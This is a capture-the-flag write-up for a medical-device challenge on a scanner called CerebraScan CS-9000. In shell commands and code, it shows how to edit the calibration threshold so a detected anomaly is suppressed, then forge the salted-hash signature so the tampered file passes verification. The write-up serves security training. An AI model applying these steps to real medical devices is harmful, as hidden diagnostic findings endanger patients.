# DEADFACE CTF 2026 — Bad Calibration

**Category:** Medical-Device-IoT / Device Security  
**Target:** Emedra CerebraScan CS-9000 (ScanWorks)  
**Flag:** `deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}`

---

## The Idea

The key is to follow the calibration check from the device’s own files. The scanner’s signature isn’t a secret-key signature: it’s a plain SHA-256 hash of the calibration file followed by a salt that is stored in the same configuration. So anyone who can edit the calibration can also generate a signature the scanner accepts.

Then adjust the reporting threshold so the scanner suppresses the anomalous finding, regenerate the signature, and run the scan.

## 1. Open the Service Terminal

1. Select **Live Linux USB-A** from the toolkit.
2. Click the scanner’s **USB-A Port**.
3. In the terminal, list the storage devices and mount the scanner’s data partition:

```bash
lsblk
sudo mount /dev/sda2 /mnt
```

The service USB’s README points to the ScanWorks installation at `/mnt/opt/scanworks`.

## 2. Find the Integrity Check

Inspect the calibration notes, verifier, and configuration:

```bash
cat /mnt/opt/scanworks/calibration/README
cat /mnt/opt/scanworks/calibration/verify.py
cat /mnt/opt/scanworks/config.yaml
```

The verifier computes:

```python
hashlib.sha256(calibration_bytes + salt.encode()).hexdigest()
```

The salt is `EM-2019`, stored in `config.yaml`. Since that value is available alongside the calibration, this check doesn’t prove who created the signature. Anyone able to edit the calibration can create a new matching `.sig` file.

## 3. Change the Reporting Threshold

The calibration file is:
`/mnt/opt/scanworks/calibration/calib.json`

The original scan reports an anomaly score of `0.72`; the safe threshold is `0.35`. Set `report_above` to `0.99` so the finding is suppressed:

```bash
sed -i 's/report_above": 0.35/report_above": 0.99/' /mnt/opt/scanworks/calibration/calib.json
```

The important reasoning step is to compare the scan’s score and the calibration’s thresholds. In my run, changing `gain` and `anomaly_threshold` alone didn’t suppress the result; changing `report_above` did.

## 4. Recreate the Signature

Hash the exact calibration bytes followed by the public salt, then write just the hexadecimal digest to `calib.json.sig`:

```bash
cp /mnt/opt/scanworks/calibration/calib.json /tmp/c
printf EM-2019 >> /tmp/c
sha256sum /tmp/c > /tmp/hash
sed 's/ .*//' /tmp/hash > /mnt/opt/scanworks/calibration/calib.json.sig
```

The temporary copy matters: it ensures the hash input is the calibration file’s bytes with `EM-2019` appended, exactly as the verifier expects.

## 5. Verify and Scan

```bash
scanctl verify
scanctl scan
cat /mnt/opt/scanworks/logs/scanworks.log
```

The verifier accepts the edited calibration. The scan then reports no abnormality even though the finding score is `0.72`, above the safe threshold of `0.35`. The log marks the suppressed finding as unsafe and reveals the flag:

```text
deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
```

